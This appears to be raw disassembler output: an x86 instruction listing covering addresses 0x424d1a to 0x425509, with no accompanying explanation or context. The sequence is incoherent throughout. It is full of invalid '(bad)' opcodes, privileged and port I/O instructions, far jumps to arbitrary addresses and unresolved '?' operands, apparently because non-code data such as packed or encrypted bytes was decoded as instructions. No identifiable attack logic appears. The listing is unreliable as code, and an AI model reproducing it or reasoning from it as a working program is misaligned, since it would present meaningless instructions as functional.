  424d1a:	imul   ebx,esp,0xe04c958e
  424d20:	mov    dh,0x99
  424d22:	aad    0x8e
  424d24:	push   ebx
  424d25:	addr16 xchg edx,eax
  424d27:	cmp    al,ah
  424d29:	mov    esi,0x6456be5a
  424d2e:	mov    ebx,0xeb96d0d0
  424d33:	mov    ebp,0xca3c4e34
  424d38:	inc    edi
  424d39:	mov    cl,0x55
  424d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d3c:	aas    
  424d3d:	bound  ebx,QWORD PTR [edi]
  424d3f:	mov    edx,0x3141ab24
  424d44:	adc    bl,BYTE PTR [edx+0x23]
  424d47:	adc    ebp,DWORD PTR [esi+0xb]
  424d4a:	std    
  424d4b:	gs mov ebx,eax
  424d4e:	out    0x23,eax
  424d50:	mov    dl,0xad
  424d52:	push   esi
  424d53:	lahf   
  424d54:	cmc    
  424d55:	sahf   
  424d56:	push   edx
  424d57:	imul   ebp,edi,0xffffffca
  424d5a:	cli    
  424d5b:	test   BYTE PTR [ebp+0x55360f18],dl
  424d61:	mov    edi,edi
  424d63:	fwait
  424d64:	sub    BYTE PTR [ebx+ecx*2+0x43],0x86
  424d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d6a:	sar    BYTE PTR [edi-0x6d2d5c37],0xd8
  424d71:	xchg   esp,eax
  424d72:	jecxz  0x424dd2
  424d74:	mov    ebx,edi
  424d76:	(bad)  
  424d77:	stos   DWORD PTR es:[edi],eax
  424d78:	inc    esi
  424d79:	sar    BYTE PTR [edi+0xb],cl
  424d7c:	iret   
  424d7d:	imul   edi,DWORD PTR [edi],0xb367171d
  424d83:	push   ebx
  424d84:	hlt    
  424d85:	jmp    0xf647d1ab
  424d8a:	retf   0x8a9
  424d8d:	pop    ecx
  424d8e:	bsf    ebx,DWORD PTR [edi]
  424d91:	out    dx,eax
  424d92:	add    dh,BYTE PTR [edi+0x75]
  424d95:	loop   0x424de1
  424d97:	sbb    DWORD PTR [edi],edi
  424d99:	pop    ds
  424d9a:	push   cs
  424d9b:	xchg   edx,eax
  424d9c:	push   es
  424d9d:	imul   ebx,DWORD PTR [esi],0x2020e22e
  424da3:	sub    bl,dh
  424da5:	(bad)  
  424da7:	fst    DWORD PTR [ecx+0x4a0a4355]
  424dad:	mov    dh,0xd2
  424daf:	into   
  424db0:	sub    eax,DWORD PTR [esi-0x34]
  424db3:	add    DWORD PTR [ebx-0x5b],ebx
  424db6:	repz jg 0x424d64
  424db9:	jecxz  0x424e22
  424dbb:	pop    ebx
  424dbc:	sbb    ecx,DWORD PTR [edi]
  424dbe:	jnp    0x424d99
  424dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dc1:	retf   
  424dc2:	sbb    eax,0x9
	...
  424dcf:	add    BYTE PTR [eax],al
  424dd1:	mov    ds,WORD PTR ds:0xfffbdb6b
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    bh,BYTE PTR [esi+0x1f55b594]
  424de2:	lds    eax,FWORD PTR [ecx]
  424de4:	add    BYTE PTR [ebx-0x11fffffd],ch
  424dea:	test   DWORD PTR [edx],ebp
  424dec:	jne    0x424d85
  424dee:	das    
  424def:	aas    
  424df0:	jb     0x424e3e
  424df2:	lahf   
  424df3:	xor    DWORD PTR [esi+0x6b],0xe77bdaf0
  424dfa:	jo     0x424d99
  424dfc:	lds    ebp,FWORD PTR [ecx+0x549e6eb4]
  424e02:	lods   al,BYTE PTR ds:[esi]
  424e03:	mov    ah,0xe1
  424e05:	gs pop esp
  424e07:	inc    ecx
  424e08:	mov    edi,0xb40a1893
  424e0d:	lock loop 0x424dca
  424e10:	or     ebp,DWORD PTR [eax+0x72]
  424e13:	push   ss
  424e14:	push   edi
  424e15:	cmp    DWORD PTR [ebp+0x21],esi
  424e18:	sbb    BYTE PTR [ebx+0x7d],0xf2
  424e1c:	ret    0x9020
  424e1f:	(bad)  
  424e20:	fistp  WORD PTR [eax-0x3e]
  424e23:	cld    
  424e24:	sub    al,0x3b
  424e26:	mov    WORD PTR [edx-0x48],?
  424e29:	fidiv  DWORD PTR [eax+ecx*1-0x11f04a55]
  424e30:	ret    
  424e31:	pop    ss
  424e32:	mov    WORD PTR [eax-0x48],ds
  424e35:	add    bh,ah
  424e37:	mov    WORD PTR [ebx],fs
  424e39:	add    bh,BYTE PTR [ebp-0x6]
  424e3c:	pop    eax
  424e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e3e:	jg     0x424e31
  424e40:	add    BYTE PTR [eax+ebp*2+0x75],dl
  424e44:	or     BYTE PTR [ebx-0x6a],dh
  424e47:	xor    DWORD PTR [edx-0x4df867e4],esi
  424e4d:	ins    DWORD PTR es:[edi],dx
  424e4e:	cmp    ch,bl
  424e50:	pop    ebp
  424e51:	inc    ebx
  424e52:	inc    edi
  424e53:	sti    
  424e54:	sub    edx,DWORD PTR [ebx+0x345e4458]
  424e5a:	mov    ebp,0xa15043d8
  424e5f:	(bad)  
  424e60:	adc    al,bl
  424e62:	ja     0x424e6a
  424e64:	(bad)  
  424e65:	aam    0x4f
  424e67:	or     DWORD PTR [esi+0x6a90a696],0xffffffba
  424e6e:	xchg   esp,eax
  424e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e70:	mov    eax,0x7e588da3
  424e75:	xor    DWORD PTR [esi+0x20],eax
  424e78:	cmp    DWORD PTR [ecx],ebp
  424e7a:	test   eax,0xf8102fdb
  424e7f:	(bad)  
  424e80:	outs   dx,DWORD PTR ds:[esi]
  424e81:	jns    0x424e3f
  424e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e84:	xchg   BYTE PTR [esi-0x2d9d706c],cl
  424e8a:	mov    esi,0x1b5a0a4b
  424e8f:	mov    cs,WORD PTR [ecx-0x1c]
  424e92:	js     0x424e52
  424e94:	push   edi
  424e95:	fimul  WORD PTR fs:[ecx+0x89b78a0]
  424e9c:	cli    
  424e9d:	sub    DWORD PTR [eax],ebx
  424e9f:	and    eax,0xbe82e9fe
  424ea4:	add    DWORD PTR [ebp+0x2f6c3ae8],esp
  424eaa:	je     0x424ed2
  424eac:	cdq    
  424ead:	push   esp
  424eae:	xchg   DWORD PTR [edi],edi
  424eb0:	dec    edx
  424eb1:	jl     0x424eb3
  424eb3:	adc    al,0xaf
  424eb5:	(bad)  
  424eb6:	mov    ebx,0xa81d1092
  424ebb:	xor    eax,0x6638b6ad
  424ec0:	inc    esi
  424ec2:	inc    esp
  424ec3:	test   BYTE PTR [ebx+ebx*1+0x6c448ce0],dh
  424eca:	xchg   ebp,eax
  424ecb:	test   DWORD PTR [esi+0x23],ebx
  424ece:	or     BYTE PTR [edx+eiz*8+0x47ac6953],cl
  424ed5:	stos   DWORD PTR es:[edi],eax
  424ed6:	repz sar BYTE PTR [ebx+0x7081f515],cl
  424edd:	mov    ah,BYTE PTR [edx-0x18]
  424ee0:	push   ss
  424ee1:	jb     0x424f43
  424ee3:	iret   
  424ee4:	idiv   BYTE PTR [eax]
  424ee6:	out    dx,eax
  424ee7:	into   
  424ee8:	dec    eax
  424ee9:	shl    DWORD PTR [ecx-0x1a],1
  424eec:	or     ebx,ebx
  424eee:	push   esi
  424eef:	cmp    ebx,DWORD PTR ds:0x90844a79
  424ef5:	dec    esp
  424ef6:	adc    al,0xce
  424ef8:	mov    al,0x8
  424efa:	aas    
  424efb:	jp     0x424ec6
  424efd:	mov    edi,0x8ce5d591
  424f02:	ficomp DWORD PTR [esp+eiz*8+0x19bc2ab5]
  424f09:	and    DWORD PTR [esi+0x74],esi
  424f0c:	fsubr  QWORD PTR ds:0x580e60e1
  424f12:	pop    eax
  424f13:	xchg   ecx,eax
  424f14:	and    BYTE PTR [eax+ebp*2-0xe],ah
  424f18:	inc    ecx
  424f19:	jbe    0x424f68
  424f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f1c:	cwde   
  424f1d:	jl     0x424f51
  424f1f:	sbb    BYTE PTR [edx],dl
  424f21:	(bad)  
  424f22:	xor    al,BYTE PTR [ebp-0x4f0b3097]
  424f28:	sbb    al,0x91
  424f2a:	sbb    esi,ecx
  424f2c:	mov    ds:0x9fe79fc7,al
  424f31:	sub    al,0x81
  424f33:	sar    esi,1
  424f35:	inc    ecx
  424f36:	pop    esp
  424f37:	(bad)  
  424f38:	pop    ebx
  424f39:	lock pop ecx
  424f3b:	mov    bl,0x6a
  424f3d:	int3   
  424f3e:	or     al,0x21
  424f40:	outs   dx,DWORD PTR ds:[esi]
  424f41:	mov    DWORD PTR [ecx+0x346a6d6a],ebx
  424f47:	mov    esp,DWORD PTR [ebx]
  424f49:	push   edi
  424f4a:	sub    BYTE PTR [edx],dl
  424f4c:	mov    al,0x67
  424f4e:	inc    ebx
  424f4f:	int3   
  424f50:	mov    edx,0x2081a5b1
  424f55:	xor    al,0xbe
  424f57:	(bad)  
  424f58:	xchg   ebx,eax
  424f59:	mov    ?,WORD PTR [esi-0x2b35caf7]
  424f5f:	xor    BYTE PTR [edx+0x6e1f4a8b],ah
  424f65:	sbb    esp,DWORD PTR [edi-0x7b85e4e7]
  424f6b:	xor    DWORD PTR [esi-0x5400a98e],eax
  424f71:	enter  0x5aa6,0xd5
  424f75:	dec    ebx
  424f76:	icebp  
  424f77:	fidiv  DWORD PTR [ebx]
  424f79:	retf   
  424f7a:	mov    ss,WORD PTR [ecx]
  424f7c:	lea    eax,[edi]
  424f7e:	inc    ebp
  424f7f:	mov    DWORD PTR [edi+0x59],ebx
  424f82:	add    edi,esp
  424f84:	add    al,0x3c
  424f86:	lock inc ebp
  424f88:	lock xor al,0xea
  424f8b:	aas    
  424f8c:	int3   
  424f8d:	repnz xor esp,DWORD PTR [edi-0x4041f861]
  424f94:	std    
  424f95:	push   esp
  424f96:	xor    cl,bh
  424f98:	inc    edi
  424f99:	enter  0xd4ab,0xc
  424f9d:	pop    edi
  424f9e:	push   edx
  424f9f:	out    dx,eax
  424fa0:	push   ebx
  424fa1:	jb     0x424f3c
  424fa3:	test   eax,0x49b7f853
  424fa8:	jno    0x424f95
  424faa:	or     eax,0xea0915ae
  424faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fb0:	fistp  WORD PTR [ecx-0x76]
  424fb3:	and    eax,0x47c85981
  424fb8:	jmp    0x30685daa
  424fbd:	adc    ah,dl
  424fbf:	rcl    DWORD PTR [esp+esi*2],cl
  424fc2:	mov    ebp,0x411712dd
  424fc7:	or     dh,BYTE PTR [eax-0x35712879]
  424fcd:	(bad)  
  424fcf:	cld    
  424fd0:	in     eax,dx
  424fd1:	adc    dl,dl
  424fd3:	es das 
  424fd5:	mov    ?,WORD PTR [edi+0x54]
  424fd8:	sub    al,0x3f
  424fda:	repnz cmp al,0x94
  424fdd:	pop    edx
  424fde:	and    BYTE PTR [esi],ch
  424fe0:	xor    BYTE PTR [ebx+0x5f],ch
  424fe3:	(bad)  
  424fe4:	cmp    BYTE PTR [ecx+0x4de8a07c],ch
  424fea:	inc    eax
  424feb:	adc    dh,0x90
  424fee:	pushf  
  424fef:	push   esi
  424ff0:	pop    ecx
  424ff1:	push   edx
  424ff2:	retf   0x3905
  424ff5:	mov    ah,0xbd
  424ff7:	fild   QWORD PTR [edi+0x37]
  424ffa:	pop    edx
  424ffb:	test   al,0xf3
  424ffe:	loopne 0x424ffd
  425000:	fild   QWORD PTR [edx+0x1bea734e]
  425006:	ret    0xeba5
  425009:	ds test ah,0xb6
  42500d:	lea    esi,[di]
  425010:	stc    
  425011:	sub    DWORD PTR [edx],edi
  425013:	inc    eax
  425014:	push   ds
  425015:	xor    eax,0x97101323
  42501a:	mov    dh,0x40
  42501c:	aam    0xf6
  42501e:	retf   
  42501f:	adc    ch,ah
  425021:	add    DWORD PTR [ebp-0x74],0x234ecb36
  425028:	xchg   esi,eax
  425029:	das    
  42502a:	stos   BYTE PTR es:[edi],al
  42502b:	xchg   ebp,eax
  42502c:	push   edx
  42502d:	jae    0x42506f
  42502f:	outs   dx,DWORD PTR ds:[esi]
  425030:	cld    
  425031:	and    al,BYTE PTR [esi+0x58]
  425034:	sbb    ebx,DWORD PTR [ecx+ebp*4-0x715b7c00]
  42503b:	ss pop es
  42503d:	inc    edx
  42503e:	xchg   ebp,eax
  42503f:	pop    ds
  425040:	adc    DWORD PTR [edi+0x2a82dec7],esp
  425046:	add    eax,0xad88799d
  42504b:	fisubr WORD PTR [eax+0x19]
  42504e:	mov    ch,0x6f
  425050:	mov    ebp,0xbffe8ee6
  425055:	dec    ecx
  425056:	jmp    0x1f85:0x60b3b8b
  42505d:	in     eax,dx
  42505e:	push   ds
  42505f:	loop   0x425077
  425061:	not    bh
  425063:	retf   0xbb1
  425066:	dec    ecx
  425067:	lods   al,BYTE PTR ds:[esi]
  425068:	shr    BYTE PTR [ebx],cl
  42506a:	mov    al,ds:0x2eb5bfe2
  42506f:	aad    0x44
  425071:	mov    BYTE PTR [ebx-0x241bcfb4],dl
  425077:	push   ds
  425078:	mul    ah
  42507a:	push   ebp
  42507b:	push   0xffffff9f
  42507d:	and    bh,dh
  42507f:	jle    0x42502e
  425081:	jge    0x4250e5
  425083:	adc    al,cl
  425085:	cmp    al,dl
  425087:	lahf   
  425088:	mov    ah,BYTE PTR [edi-0x66]
  42508b:	mov    esi,DWORD PTR [ebx-0x30]
  42508e:	int    0xf7
  425090:	xor    BYTE PTR [esp+edi*4],0x43
  425094:	adc    dh,BYTE PTR [esi+ecx*8-0x6e7ae18b]
  42509b:	push   0x52
  42509d:	jle    0x425098
  42509f:	mov    al,0x53
  4250a1:	dec    eax
  4250a2:	ja     0x4250d6
  4250a4:	adc    esi,DWORD PTR [ecx]
  4250a6:	pushf  
  4250a7:	aad    0xc5
  4250a9:	scas   eax,DWORD PTR es:[edi]
  4250aa:	inc    ecx
  4250ab:	popf   
  4250ac:	dec    esp
  4250ad:	dec    esi
  4250ae:	mov    cl,0x58
  4250b0:	mov    dh,0xca
  4250b2:	xchg   ebp,eax
  4250b3:	(bad)  
  4250b4:	sbb    ah,cl
  4250b6:	pusha  
  4250b7:	bound  edx,QWORD PTR [eax+0x6507328f]
  4250bd:	mov    ds:0xbce3ef41,al
  4250c2:	jp     0x42506b
  4250c4:	inc    eax
  4250c5:	pop    edi
  4250c6:	pop    edx
  4250c7:	and    BYTE PTR [edx+0x1d9b2b4d],bl
  4250cd:	and    dl,BYTE PTR [ebx+0x62]
  4250d0:	dec    eax
  4250d1:	pop    esp
  4250d2:	cmp    ecx,DWORD PTR [ebp-0x40cb1d51]
  4250d8:	sahf   
  4250d9:	mov    edx,0x28bff0c9
  4250de:	mov    dl,0x4f
  4250e0:	sbb    edx,DWORD PTR [ecx+ebp*4]
  4250e3:	inc    ecx
  4250e4:	pop    esi
  4250e5:	cs test eax,0x252743b7
  4250eb:	es sub al,0xe
  4250ee:	and    BYTE PTR [edi+0x36c9cdba],dh
  4250f4:	fnstsw WORD PTR [edx+0x701a9dc6]
  4250fa:	loopne 0x42508f
  4250fc:	pushf  
  4250fd:	daa    
  4250fe:	sbb    al,0xf6
  425100:	daa    
  425101:	jmp    0x8d27:0x590a1231
  425108:	push   es
  425109:	lds    esp,FWORD PTR [esi+0x1f9745ec]
  42510f:	loope  0x4250a8
  425111:	sub    al,0x49
  425113:	mov    eax,0x8db659b7
  425118:	fidivr WORD PTR [eax]
  42511a:	outs   dx,DWORD PTR ds:[esi]
  42511b:	inc    eax
  42511c:	adc    BYTE PTR [ebx-0x4ce774dc],bh
  425122:	repz iret 
  425124:	sar    BYTE PTR [ecx+0x2],1
  425127:	mov    dh,BYTE PTR [esi+0x1474fdb1]
  42512d:	fstp   QWORD PTR [edi+0x55]
  425130:	push   eax
  425131:	and    al,0x2c
  425133:	cmp    eax,0xea016ebd
  425138:	js     0x4250ce
  42513a:	mov    cl,0xc3
  42513c:	sbb    DWORD PTR [ecx],edx
  42513e:	push   ebx
  42513f:	mov    edx,0x65738686
  425144:	mov    edx,0xeb69635a
  425149:	sub    esp,ecx
  42514b:	sbb    ah,BYTE PTR [edi+0x6b]
  42514e:	das    
  42514f:	mov    ds,esi
  425151:	mov    BYTE PTR [ebp+0x6d],dh
  425154:	mov    ah,0xfc
  425156:	lahf   
  425157:	enter  0xa346,0x74
  42515b:	xor    eax,0x790a4c4e
  425160:	jmp    0x4251bb
  425162:	in     eax,0xc
  425164:	mov    esp,0x48755a10
  425169:	ss dec ecx
  42516b:	and    edi,esp
  42516d:	jmp    0xfc786da0
  425172:	pop    esp
  425173:	push   0x4fec10bf
  425178:	fs inc eax
  42517a:	lds    edi,FWORD PTR [ebp+0x43]
  42517d:	in     eax,0xf6
  42517f:	inc    eax
  425180:	xchg   DWORD PTR [eax-0xd],esp
  425183:	pushf  
  425184:	lock retf 
  425186:	inc    esi
  425187:	adc    DWORD PTR [esi-0x3bcb7272],esi
  42518d:	xor    BYTE PTR ds:0x1b63fde7,bl
  425193:	jo     0x425195
	...
  4251a1:	imul   edi,DWORD PTR [esi-0x480049c5],0x4a7bffed
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	push   edx
  4251ae:	inc    ebp
  4251af:	lods   eax,DWORD PTR ds:[esi]
  4251b0:	or     ecx,edx
  4251b2:	enter  0x1,0xab
  4251b6:	add    eax,DWORD PTR [eax]
  4251b8:	add    BYTE PTR [edi],cl
  4251ba:	mov    al,ds:0xf6174d24
  4251bf:	mov    ebx,0x8be9f009
  4251c4:	leave  
  4251c5:	dec    ebx
  4251c6:	jns    0x42521f
  4251c8:	jecxz  0x42520d
  4251ca:	sub    al,0x20
  4251cc:	lods   eax,DWORD PTR ds:[esi]
  4251cd:	imul   esi,DWORD PTR [ebx],0x8ff7f9bc
  4251d3:	jg     0x4251bf
  4251d5:	inc    ebp
  4251d6:	outs   dx,BYTE PTR ds:[esi]
  4251d7:	and    eax,0x58168789
  4251dc:	add    DWORD PTR [esi+0x2d],esp
  4251df:	(bad)  
  4251e0:	int    0x8b
  4251e2:	sub    dl,BYTE PTR [ecx]
  4251e4:	bound  edi,QWORD PTR [eax+0x7b]
  4251e7:	fidivr DWORD PTR [edi+0x71]
  4251ea:	push   0x47b635b
  4251ef:	(bad)  
  4251f0:	call   0x16eaa168
  4251f5:	inc    ebp
  4251f6:	leave  
  4251f7:	sbb    dh,BYTE PTR [ecx+0x4d9b72b0]
  4251fd:	nop
  4251fe:	dec    ecx
  4251ff:	mov    ecx,?
  425201:	std    
  425202:	aaa    
  425203:	leave  
  425204:	les    ebx,FWORD PTR [ecx+0x30]
  425207:	push   0xa4786244
  42520c:	pop    eax
  42520d:	scas   eax,DWORD PTR es:[edi]
  42520e:	out    dx,al
  42520f:	push   ecx
  425210:	sub    al,0x24
  425212:	mov    BYTE PTR [edx+0x79],bl
  425215:	mov    ebx,0xfda423af
  42521a:	dec    edi
  42521b:	stos   DWORD PTR es:[edi],eax
  42521c:	xor    edx,esp
  42521e:	push   0xff3c5ee9
  425223:	push   ebx
  425224:	add    ecx,DWORD PTR [esi]
  425226:	aam    0x58
  425228:	in     al,0x74
  42522a:	mov    dl,0x6e
  42522c:	sub    ch,BYTE PTR [ebp-0xc]
  42522f:	fs ss push ebx
  425232:	hlt    
  425233:	mov    ebx,0x2841ad7b
  425238:	test   eax,0x45c347b1
  42523d:	ins    BYTE PTR es:[edi],dx
  42523e:	outs   dx,DWORD PTR ds:[esi]
  42523f:	cmp    BYTE PTR [edx-0x5435af9f],dl
  425245:	jmp    0x4252bb
  425247:	adc    eax,0x586a73bc
  42524c:	inc    ebx
  42524d:	push   ebp
  42524e:	adc    bl,0x22
  425251:	jo     0x4252d0
  425253:	add    esi,DWORD PTR [ebp-0x742521d3]
  425259:	ja     0x4252cc
  42525b:	cmp    ah,ah
  42525d:	scas   al,BYTE PTR es:[edi]
  42525e:	dec    BYTE PTR ds:0xdf7e86ec
  425264:	scas   al,BYTE PTR es:[edi]
  425265:	and    eax,0x3492e08f
  42526a:	(bad)  
  42526b:	dec    esi
  42526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42526d:	xlat   BYTE PTR ds:[ebx]
  42526e:	sbb    DWORD PTR [eax+0x1a9bc953],0xffffffff
  425275:	and    BYTE PTR [ebp+0x6cc11a28],ah
  42527b:	test   BYTE PTR [ecx+ebp*1],cl
  42527e:	xor    DWORD PTR [edi-0x1f],ebx
  425281:	rol    BYTE PTR ds:0xf38bd86b,cl
  425287:	sub    BYTE PTR [bx+0xde3],ah
  42528c:	sti    
  42528d:	and    edi,ebp
  42528f:	fucomi st,st(7)
  425291:	push   edx
  425292:	cmc    
  425293:	add    al,0x28
  425295:	rep outs dx,BYTE PTR ds:[esi]
  425297:	push   esp
  425298:	cmc    
  425299:	pop    ds
  42529a:	scas   eax,DWORD PTR es:[edi]
  42529b:	cs add ebp,ecx
  42529e:	jnp    0x425248
  4252a0:	pop    ds
  4252a1:	xor    al,0xe6
  4252a3:	adc    eax,0xc
  4252a6:	iret   
  4252a7:	jbe    0x425299
  4252a9:	adc    esi,DWORD PTR ds:0x229df7b8
  4252af:	fwait
  4252b0:	xor    BYTE PTR [eax],al
  4252b2:	mov    al,0xf9
  4252b4:	mov    dh,0x9e
  4252b6:	mov    BYTE PTR [ebp+0x37],bh
  4252b9:	inc    eax
  4252ba:	mov    bh,0x72
  4252bc:	and    edi,ebx
  4252be:	out    0x77,eax
  4252c0:	mov    ch,0x4b
  4252c2:	iret   
  4252c3:	jbe    0x4252f5
  4252c5:	fstp   QWORD PTR [esi+edi*8+0x584f469c]
  4252cc:	and    DWORD PTR [edi],0x49
  4252cf:	jns    0x42532f
  4252d1:	mov    ds:0x54bb41b9,al
  4252d6:	cli    
  4252d7:	or     DWORD PTR [eax],edx
  4252d9:	imul   esp,DWORD PTR [edi-0x193d67b0],0x2b
  4252e0:	jl     0x425285
  4252e2:	xor    edi,esi
  4252e4:	push   esi
  4252e5:	daa    
  4252e6:	repnz scas al,BYTE PTR es:[edi]
  4252e8:	pop    ebp
  4252e9:	xchg   esi,eax
  4252ea:	mov    bl,0x3d
  4252ec:	push   cs
  4252ed:	mov    ds:0xf59d0cef,al
  4252f2:	or     al,0x2c
  4252f4:	mov    edi,0x3b549e0
  4252f9:	xchg   ebx,eax
  4252fa:	stos   BYTE PTR es:[edi],al
  4252fb:	mov    dl,0x71
  4252fd:	push   ebp
  4252fe:	imul   ebp,DWORD PTR [ebx+0x36e38fb5],0x25f32e0
  425308:	push   cs
  425309:	dec    ecx
  42530a:	dec    esi
  42530b:	push   edx
  42530c:	adc    BYTE PTR [edi+edx*8],ch
  42530f:	inc    DWORD PTR [ebp-0x7458ec5f]
  425315:	loopne 0x4252e6
  425317:	dec    eax
  425318:	push   edi
  425319:	xor    al,0xf7
  42531b:	(bad)  
  42531c:	pusha  
  42531d:	jne    0x4252e0
  42531f:	jno    0x425320
  425321:	cmp    DWORD PTR [ecx+0x7b],ebx
  425324:	pop    esi
  425325:	int    0x6e
  425327:	ins    BYTE PTR es:[edi],dx
  425328:	cmp    al,0xae
  42532a:	popa   
  42532b:	adc    ch,ah
  42532d:	loopne 0x4253ad
  42532f:	imul   ebp,esp,0x26
  425332:	leave  
  425333:	add    BYTE PTR [ebp-0x66f4ad80],0x8
  42533a:	dec    edx
  42533b:	inc    esp
  42533c:	nop
  42533d:	xor    al,0x11
  42533f:	out    0x9,eax
  425341:	mov    al,0x39
  425343:	mov    ch,0x6e
  425345:	pop    ecx
  425346:	inc    edi
  425347:	mov    ds:0xbb72d2b7,al
  42534c:	retf   0xcbc6
  42534f:	push   es
  425350:	ss (bad) 
  425352:	repz clc 
  425354:	lods   al,BYTE PTR ds:[esi]
  425355:	jo     0x425306
  425357:	dec    esi
  425358:	cdq    
  425359:	push   es
  42535a:	inc    edi
  42535b:	lahf   
  42535c:	repnz std 
  42535e:	cmc    
  42535f:	into   
  425360:	call   0xce46:0xa765455b
  425367:	jae    0x42537f
  425369:	ret    
  42536a:	xchg   edi,eax
  42536b:	fst    st(1)
  42536d:	fwait
  42536e:	ror    DWORD PTR [eax+0x17],cl
  425371:	jbe    0x42536c
  425373:	les    esi,FWORD PTR [edx]
  425375:	mov    esi,0xdec55e8a
  42537a:	adc    esi,esp
  42537c:	cdq    
  42537d:	hlt    
  42537e:	in     eax,0x9c
  425380:	jle    0x4253b3
  425382:	sbb    al,0xcc
  425384:	mov    ?,WORD PTR [eax+0x31]
  425387:	cmc    
  425388:	adc    eax,0x1e9d35f2
  42538d:	js     0x425311
  42538f:	pushf  
  425390:	and    BYTE PTR [esi+0x39],ah
  425393:	inc    eax
  425394:	pusha  
  425395:	loope  0x425341
  425397:	in     eax,0x82
  425399:	in     eax,dx
  42539a:	not    DWORD PTR ds:0x76417809
  4253a0:	(bad)  
  4253a1:	sti    
  4253a2:	xchg   edx,eax
  4253a3:	jo     0x425407
  4253a5:	dec    eax
  4253a6:	mov    esi,0xbf150f8
  4253ab:	sar    DWORD PTR [edi+esi*1-0x1783d8c1],1
  4253b2:	jae    0x42538f
  4253b4:	pop    esp
  4253b5:	push   esi
  4253b6:	inc    ecx
  4253b7:	ror    DWORD PTR [edx-0x11],cl
  4253ba:	int    0xfe
  4253bc:	das    
  4253bd:	ds mov eax,0x2cc94851
  4253c3:	pusha  
  4253c4:	and    ecx,edi
  4253c6:	(bad)  [ebp+ebx*8-0x4f1e77fe]
  4253cd:	ret    0x7b18
  4253d0:	out    0xea,al
  4253d2:	mov    esi,0x7a731098
  4253d7:	mov    ecx,0xaf8f4fea
  4253dc:	shl    edi,1
  4253de:	mov    ds:0x4a06cc8b,al
  4253e3:	mov    al,ds:0x89ea2909
  4253e8:	jno    0x4253a9
  4253ea:	cs cmp eax,0x3e2d790a
  4253f0:	inc    esp
  4253f1:	sub    bl,ah
  4253f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253f4:	sub    BYTE PTR ds:0xe87d94da,al
  4253fa:	jmp    0x4253d5
  4253fc:	push   edi
  4253fd:	inc    ebp
  4253fe:	xchg   edx,eax
  4253ff:	mov    ss,WORD PTR [ebp-0x74d21303]
  425405:	or     eax,0xd525de93
  42540a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42540b:	in     eax,0x42
  42540d:	or     edi,DWORD PTR [edx]
  42540f:	jmp    0x425443
  425411:	aam    0x53
  425413:	popf   
  425414:	sahf   
  425415:	mov    ds:0x3420a8be,al
  42541a:	sti    
  42541b:	lock fdiv st(5),st
  42541e:	lods   eax,DWORD PTR ds:[esi]
  42541f:	jmp    0x35bf739c
  425424:	push   0xf06cc313
  425429:	mov    cl,0x8d
  42542b:	jmp    0x4253ff
  42542d:	cmp    ecx,DWORD PTR [esi-0x4edaedfc]
  425433:	repnz in eax,0x31
  425436:	ficom  WORD PTR [ebx]
  425438:	dec    ebx
  425439:	xchg   esp,eax
  42543a:	retf   0xb3bc
  42543d:	xor    al,0xe1
  42543f:	xchg   ebx,eax
  425440:	sbb    al,0xa1
  425443:	cdq    
  425444:	jl     0x4254a6
  425446:	push   edi
  425447:	or     eax,0x38b7f5a3
  42544c:	ror    BYTE PTR [ecx+ebx*2-0x67],1
  425450:	repnz add al,cl
  425453:	push   esp
  425454:	nop
  425455:	(bad)  
  425456:	fidiv  DWORD PTR [eax]
  425458:	jmp    0x140d:0xdd05fe79
  42545f:	add    al,0x8
  425461:	push   DWORD PTR [ebp-0x9]
  425464:	sbb    eax,0x9d18bec2
  425469:	in     eax,0x8e
  42546b:	lahf   
  42546c:	in     al,dx
  42546d:	outs   dx,DWORD PTR ds:[esi]
  42546e:	or     al,0x97
  425470:	mov    eax,0x61bf7af
  425475:	retf   0x79e3
  425478:	mov    ah,BYTE PTR [ebp-0x53]
  42547b:	and    BYTE PTR [edx],bh
  42547d:	lods   al,BYTE PTR ds:[esi]
  42547e:	ds push 0x53952aac
  425484:	push   ss
  425485:	pop    ebx
  425486:	inc    ebp
  425487:	popa   
  425488:	dec    edi
  425489:	nop
  42548a:	adc    DWORD PTR [ebp-0x2863bb23],edi
  425490:	mov    ebp,0xaac2525f
  425495:	rcr    BYTE PTR [esi+0x14e65fde],1
  42549b:	push   ss
  42549c:	mov    cl,0x6a
  42549e:	(bad)  
  42549f:	dec    edi
  4254a0:	push   ebx
  4254a1:	xor    BYTE PTR [ebx],ah
  4254a3:	inc    eax
  4254a4:	mov    ds:0x1729a1d8,al
  4254a9:	les    ebp,FWORD PTR ds:0xc7bc91cc
  4254af:	fxch   st(3)
  4254b1:	adc    al,0x4a
  4254b3:	je     0x4254d7
  4254b5:	and    al,0x95
  4254b7:	sbb    esi,DWORD PTR ds:0x745a3fe
  4254bd:	jmp    0xd66c:0x28ffe034
  4254c4:	mov    al,cs:0x6146f3f
  4254ca:	mov    bl,0x8d
  4254cc:	mov    ?,WORD PTR [ecx]
  4254ce:	retf   0xfc5f
  4254d1:	in     eax,0x17
  4254d3:	push   ebp
  4254d4:	dec    esp
  4254d5:	pusha  
  4254d6:	xchg   edi,eax
  4254d7:	xchg   DWORD PTR [edi],eax
  4254d9:	add    eax,0x9ba258
  4254de:	cmp    al,0xe9
  4254e0:	out    dx,eax
  4254e1:	jbe    0x42555f
  4254e3:	imul   esp,DWORD PTR [esi+0x596cf7df],0x1e816c1
  4254ed:	pushf  
  4254ee:	or     eax,ecx
  4254f0:	call   0x6fe4:0x8b56dffd
  4254f7:	cmp    dl,BYTE PTR [edx+0x53]
  4254fa:	mov    edi,0x3745fd77
  4254ff:	add    al,ah
  425501:	popf   
  425502:	les    ebp,FWORD PTR [esi-0x59]
  425505:	xor    dh,BYTE PTR [edx]
  425507:	jae    0x42557b
  425509:	shld   DWORD PTR [edx],ebp,cl
